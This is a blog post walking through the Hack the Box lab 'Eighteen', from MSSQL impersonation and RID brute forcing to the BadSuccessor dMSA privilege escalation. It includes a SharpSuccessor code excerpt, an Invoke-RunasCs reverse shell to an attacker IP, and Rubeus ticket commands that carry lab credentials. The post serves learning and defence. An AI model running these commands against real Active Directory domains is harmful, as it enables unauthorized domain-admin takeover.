---
title: Conquering dMSA's in HTB's "Eighteen" 
author: John
date: 2026-08-22 11:33:00 -0500
categories: [Security]
tags: [Pentesting]
pin: true
math: true
mermaid: true
image:
 path: assets/img/complete.png
---


As a part of my learning journey as a Cyber Security Engineer, I bought myself a Hack the Box (HTB) labs subscription. Using HTB, I aim to practice my technical pentesting skills and my ability to explain technical concept to less technical audiences. 

This month, I worked on the lab "eighteen" which was an Active Directory based lab. The lab starts with compromising user credentials on a SQL server,  and quickly escalates from there. This lab taught me about a new privileged escalation path via delegated managed service accounts (dMSAs) called BadSuccessor and challenged my understanding of Active Directory, Kerberos, and much more. Let's dive in!  
  

### Recon and Background

  

With this lab, I was given a username and credentials to begin testing. For my enumeration. I began with a simple nmap scan: ```nmap -sV -Pn HOST```.  

![Alt text](/assets/img/recon_nmap.png)

  

From my scan, I saw that the host was running Microsoft (MS) IIS httpd (80), MS SQL Server (1433), and MS HTTPAPI (5985). My attention first drew to WinRM (port 5985). In the past I've used evil-winrm to connect to devices running this service, and since I already had user credentials this seemed like an easy path to a foothold on the network. I tried connecting to the target but had no luck.  Next on my list was testing the SQL server. Using the impacket module `mssqlclient`, I authenticated to the server and had my initial foothold.

  

### Finding the User Flag

  

With my new position on the network, I need to perform additional reconnaissance. I started by running `enum_db` to see what databases I had access to as my user. I then enumerated what other users existed and which of those users I could impersonate. From this recon  I discovered that the user Kevin (my user)  could impersonate the `appdev` user.

  

![Alt text](/assets/img/impersonate_kevin.png)

  

Now that I have a user I can impersonate, I have potential lateral movement path. After impersonating the appdev user, I re-enumerated the databases and users to see how my permissions may have changed. It was at this point that I discovered my user could access the `finicial_app` database (DB). My immediate question was, what's in the finicial_app DB that I could use? Well for starters, it would help if I listed the schema or what makes up the table. Within the schema, I saw that there was a field for users. Well, what's in the user schema? 

  

![Alt text](/assets/img/sql_commands.png)

  
  
### Finding my User
Well, sweet, I got a password hash to work off of! Let's pop this into a text file, run it through our trusty hash cracker of choice and keep rolling. Well long story short, I was thinking too outside the box when I was trying to crack this hash. After going down numerous dead ends trying to crack this thing I eventually accepted that I needed something to get me back on track. It was at this point that turned to the published walk through to see what I might have been missing. Getting stuck and working through the problem is part of the learning process, but it is also important to recognize when you need some help to get moving again and this was one of those case. From the write-up I learned that the hash was encoded with base64 among other things and could be decoded using a python script.

After I cracked password hash, I wanted to authenticate somewhere. Well that's great and all but a password without a username to go with can make authenticating a little difficult. So, I began working out how I could get a list of domain users. Luckily this wasn't my first time solving this problem so fell back on my trusty old friend: RID Bruteforcing. 

#### RID Bruteforcing

In windows you have Security Identifiers (SID) and Relative Identifiers (RID) that help identify objects and accounts on the domain. I like to think about it in terms of manufacturing where you have serial numbers comprised of model number and a unique individual number. Think of an SID like the model number. The SID denotes what group or user is. Is it an Admin account? a Guest?  These SID numbers a common across all [Windows environment] (https://learn.microsoft.com/en-us/windows/win32/secauthz/well-known-sids). The RID value on the other hand is a value unique to each user. As an authenticated on the domain, we can use tools (like netexec) to bruteforce different combinations of SIDs + RIDs and list what users exist on the domain. 

  

![Alt text](/assets/img/users.png)

  
  

After finding a list of users, I then created a list of users that I was able to pass into a netexec winrm enumeration module. This module enumerated the users and tried their username + the password I found in the cracked hash. After identifying the correct user + password combo, via netexec, I authenticated to the target using evil-winrm. 

### LOST

  

After gaining access, I then enumerated the environment using Powershell commands which was... a choice. During this enumeration process I wanted to determine what type of device I was on (domain controller? workstation? a server?) and what permissions my user had.

At this point in the lab, I got bogged down. I was slowly typing out commands to try and best piece together a picture of the permissions that this user had and I felt like I was going nowhere fast. I took a break and realized I was overlooking a major tool in my toolbox: Bloodhound. Instead of coming up with my own queries and running each one, I could upload a Sharphound executable, the bloodhound collector, and run it in the environment to do all the enumeration I may need.

After I ran sharphound, I downloaded the JSON output and interpreted the results in Bloodhound web UI.  Looking at the permissions of the user I compromised `adam.scott`, I saw that I was a part of the IT group. This was the first rabbit whole that I went down as I thought that I might be able to abuse this group membership. Within the permission of this group I saw that I had `PS Remote` access to the domain controller. Upon further reasoning and research I determined that these permissions would really just grant me the ability to remotely run Powershell as my current user. Nothing new. Back to the drawing board.

  

![Alt text](/assets/img/Adam_Scott_Groups.png)

![Alt text](/assets/img/scott_perms.png)

  

Taking a step back from Bloodhound, I decided to upload the PowerView to my target. PowerView is basically a beefed up Powershell module that facilitates domain recon. Using PowerView, I was able to reveal different ACLs (Access Control Lists) related to my current user by running the command "Get-DomainObjectAcl -Identity "adam.scott"". Think of an ACL as a list of who can access what resource and with what rights. From the ACLs for my user "adam.scott" I discovered that I had "CreateChild" permissions over the "Staff" organizational unit (OU).

  

![Alt text](/assets/img/createChild.png)

  

### Found? - The Resource Based Constrained Delegation Goose Chase


My train of thought at this point in the challenges was as follows: 

I see that I have this permission to create children in the OU "Staff". Ok, what does that mean I can do? Well that means I have the ability to create a new user or computer within the OU of "Staff". Cool. How can I abuse that permission? Well, what if I can give the child I created more permissions than my initial user (adam.scott) has? This would be the perfect avenue for privilege escalation!

  

To a more technical audience, the attack path I was going for here was essentially a form of Resource Based Constraint Delegation or RBCD. RBCD relies on having a compromised account with "msDS-AllowedToActOnBehalfOfOtherIdentity" permissions on our target (i.e. domain controller) and a machine account quota (MQA) that would allow for the attacker to create another device. If both of these privledges exist, an attacker can create device and then overwrite the "msDS-AllowedToActOnBehalfOfOtherIdentity" attribute on the target so that it delegates to the attacker created device. After delegation is granted to the attacker device, the attacker can request service tickets as the target via S4U2Self (allows a service to obtain a ticket to iteself on behalf of user) and S4U2Proxy (allows service to request a ticket from another service) -- both of these actually comeback into play for the real priv esc path. Using these two settings, an attacker can get a service ticket for the service running on the target machine which leads to initial access and priv esc. While I thought something like RBCD was the right attack path, it didn't work out because I didn't have "msDS-AllowedToActOnBehalfOfOtherIdentity" permission on my target (the domain controller). 

After this attack failed, I took a step back and did some Googling (arguably what I should have done first, but hey we're learning). From a quick searching using some of the information I found during my recon, I got a hit for an attack path I hadn't heard of: Bad Successor.

  
  
  

![Alt text](/assets/img/google_search.png)

  
  
  

### Actually Found: Hello BadSuccessor


BadSuccessor abuses the delegated Managed Service Account (dMSA) setting found in Windows Server 2025 to allow an attack to elevate their privileges by creating a dMSA linked to a higher privilege account or service. dMSA is a feature within Windows Server 2025 that is designed to allow legacy accounts can migrate their permissions to a newer, "more secure", dMSA account. A dMSA itself is a machine account whose authentication is linked to a device identity (object in AD). Microsoft designed dMSA's in this way so only designated machine identities can access the account. This small distinction means that unlike a service account, who's Kerberos ticket can be requested by any user, a dMSA has a limited list of identities that it can be accessed by. Long story short, an attacker can't the kerberoast the dMSA unless their account is linked to the dMSA. Well that all sounds great! But looking deeper at the migration process reveals some potential flaws that an attacker can leverage.


During the dMSA migration process, a superseded process can still authenticate to the Domain Controller (DC). The key distribution center (KDC) recognizes the legacy account and adds it to the list of principals that are allowed to retrieve the dMSA's password. This permission enables every account that was dependent on the previous legacy account to have the ability to authenticate to the new dMSA. 

Once the migration process is complete, the dMSA has all of the permissions of the superseded account. If a client tries requests a ticket using the previous service account, the domain controller responds with an error indicating that the service account has been superseded by the dMSA (sends _KRB-ERROR_ will contain the _KERB-SUPERSEDED-BY-USER_ field) . The client then automatically retries using the new dMSA account instead, and if the account is listed in the _msDS-GroupMSAMembership_ attribute of dMSA then the client is granted the ticket for the dMSA. 


For BadSuccessor attack path, we simulate the migration process. Instead of directly trying to perform a dMSA migration on a pre-built object, which requires Domain Admin permissions, an attacker needs to create their own dMSA object and overwrite the preceded account target to any account that we want (done by modifying the _msDS-ManagedAccountPrecededByLink_). Additionally we can modify the _msDS-DelegatedMSAState_ value in the dMSA that we create to show that the migration process was completed even though no migration occurred. The simulation of a migration is what allows us to trick the KDC into thinking our attacker dMSA superseded the targeted account. Because the KDC believes our dMSA was made from the target account, it inherits the permissions of the target. This means that the KDC will now grant users with access to the dMSA the same permissions as the superseded account. 
  

#### Attempt One: Manually Exploiting via Powershell Commands

  

Ok, let's circle back. Our compromised user, adam.scott, has CreateChild permissions in the OU staff. Using these permissions, we can create a dMSA. With our dMSA we will fake a migration process and set our target user to be a domain admin. The KDC will think that a successfully migration has taken place, allowing for us to request a dMSA ticket and be granted the permissions of our target user. So, let's try it out!

  

When I first attempted this exploit, I directly followed the white paper published by the researcher [Yuval Gordon at Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory). In that paper the author runs a series of powershell commands to create the dMSA and manually write to the PrecededByLink and the DelegateMSAState. I started by first creating a test account called "first_dmsa". After creating this account I then verified the settings for the DelegateMSAState setting by running the powershell command ```Get-ADServiceAccount -Identity "first_dmsa" -Properties * `|` Format-List```. Which generated the output shown below:

  

![Alt text](/assets/img/manual_delegated.png)

  

From the output, we can see that the delegation state of the account shows up as 0. From the research done by Akamai, the state being set to '0' is an unknown value that could indicate that the dMSA is disabled. An interesting thing that I noticed at this point was that the PrecededByLink field was missing from the properties of the dMSA. I manually tried to set the attribute, but received a permission denied error.

  

![Alt text](/assets/img/failed_pre.png)

  

This behavior didn't make sense to me. Maybe it was the fact that the migration process was in an unknown state (0) instead of a completed migration state that caused my permissions update to fail or maybe it was acutally a permissions issue for my user.

During my enumeration with PowerView, I saw that adam.scott had the "WriteDACL" permission over the OU "Staff". WriteDACL is the permission that should allow my user to modify the discretionary access control list (DACL) that is associated with a specific object. The DACL specifies which users or groups can access the object and with what permissions. I assumed then that if this permission is enabled, then my user can create an object within the Staff OU and modify the permissions as I see fit. There had to be something I wasn't seeing or something I wasn't understanding about how permissions worked for this user... or there was something I was forgeting. 

I a couple paragraphs back, when describing how the dMSA migration process worked, I stated "Instead of directly trying to perform a dMSA migration on a pre-built object, which requires Domain Admin permissions, an attacker needs to create their own dMSA object and overwrite the preceded account target to any account that we want (done by modifying the _msDS-ManagedAccountPrecededByLink_)." Well, there is my problem. By first creating the object on the domain, then going back and trying to overwrite the permissions built into the object at it's creation, I was trying to use permissions only accessible as a Domain Admin. What I needed to do was set all of the permissions on my dMSA object then create it on the domain, not create it then try to reconfigure.  
  

#### Attempt Two: Automated Exploitation via SharpSucessor

After some research into how I could create my evil dMSA object, I came across the tool SharpSucessor by [Logan Goins] (https://github.com/logangoins/SharpSuccessor) .  Below is an excerpt from their code: 

```
newChild.Properties["msDS-ManagedAccountPrecededByLink"].Add(targetdn);
Console.WriteLine("[+] Wrote attribute successfully");
Console.WriteLine("[+] Attempting to write msDS-DelegatedMSAState attribute");
newChild.Properties["msDS-DelegatedMSAState"].Value = 2;
Console.WriteLine("[+] Attempting to set access rights on the dMSA object");

[...]

newChild.Properties["msDS-GroupMSAMembership"].Add(descriptor);
Console.WriteLine("[+] Attempting to write msDS-SupportedEncryptionTypes attribute");
newChild.Properties["msDS-SupportedEncryptionTypes"].Value = 0x1c;
Console.WriteLine("[+] Attempting to write userAccountControl attribute");
newChild.Properties["userAccountControl"].Value = 0x1000;
newChild.CommitChanges();

```

Reading through the code, Logan is setting the attributes of the dMSA that we need (namely the PrecededByLink which links the dMSA to the Administrator account) and uses CommitChanges() to save the object on domain AFTER the object is correctly configured. So, by making the changes within the object, Logan's code skirts by the permissions issues I ran into. 
###### Running SharpSuccessor

After uploading SharpSuccessor to the environment via evil-winrm, I ran the following command to create my dMSA object:

```
./SharpSuccessor.exe add /impersonate:Administrator /path:"OU=Staff,DC=eighteen,DC=htb" /account:adam.scott /name:john_dmsa

```

![Alt text](/assets/img/obj_cre.png)

Once I had my dMSA object, I need to get a Kerberos ticket for that account. Since my user (adam.scott), should be listed in the msDS-GroupMSAMembership attribute of the dMSA, I should have the necessary permissions to retrieve  a ticket on behalf of the dMSA. Let's check this permission using Powershell and PowerView:


![Alt text](/assets/img/adam_msD.png)



Now that we have confirmed adam.scott is listed in the msDS-GroupMSAMembership attribute we can start the process of getting a ticket for the dMSA. Before we can start messing with tickets we first need to change our Powershell logon type to 9 which allows us to perform Kerberos ticket operation. To do this I am going to run a basic reverse shell using Invoke-RunAs. 

```
Invoke-RunasCs -Username adam.scott -Password 'iloveyou1' -Domain eighteen.htb -Command 'powershell.exe' -l 9 -remote 10.10.14.83:1337

```

Reverse Shell Connection on Host:
![Alt text](/assets/img/second_shell.png)

Now that we have a session set up to support Kerberos ticket operations, we can request a ticket granting ticket (TGT). Once our user has a TGT, we can use it to request a TGS  (Ticket Granting Service) ticket which will allow us to access dMSA. 

###### Getting a Ticket Granting Ticket for adam.scott

To get our TGT, I  used the `asktgt` function within Rubeus via the following command:

```
.\Rubeus.exe asktgt /domain:eighteen.htb /user:adam.scott /password:iloveyou1 /ptt /nowrap
```
![Alt text](/assets/img/error.png)
From the error message above, KDC_ERR_ETYPE_NOTSUPP, I can see that my requested form of authentication (via a plaintext password) is not supported by the KDC. Instead of using a password, I am going to generate the hashed password of my user and use that to authenticate.

Command: 
```
.\Rubeus.exe hash /domain:eighteen.htb /user:adam.scott /password:iloveyou1  
```
![Alt text](/assets/img/trying_pass.png)
Now that we have a hash, let's use it to get our TGT.

Command:
```

.\Rubeus.exe asktgt /domain:eighteen.htb /user:adam.scott /aes256:02F93F7E9E128C32449E2F20475AFCDFB6CC2B4444AC8FD0B02406AF018F75E5 /ptt /nowrap
```
![Alt text](/assets/img/tgt_hash.png)


Notice how the command above uses the Pass-The-Ticket (PTT) option. This options allows us to save TGT in our session memory which will be particularly helpful as we perform additional Kerberos operations like getting the TGS. 

###### Getting a Ticket for our dMSA

Command:
```
.\Rubeus.exe asktgs /targetuser:john_dmsa$ /service:krbtgt/eighteen.htb /opsec /dmsa /nowrap /ptt /ticket: [ticket from last command]
```


![Alt text](/assets/img/asktgs.png)


Armed with a TGS, which allows us to act as the malicious dMSA that we created, we can now access anything that a Administrator user could access! Let's use this access to view the root flag.


![Alt text](/assets/img/finished.png)



![Alt text](/assets/img/complete.png)

#### The End :')

This lab was a great exercise in understanding how the underlying vulnerability worked. If i had just sped through the challenge and automated everything away to tools, I don't think I would have really grasped how this attack path worked. It was frustrating and hard at times, but it made me better. Thank you all for reading and I will see you in the next post! 
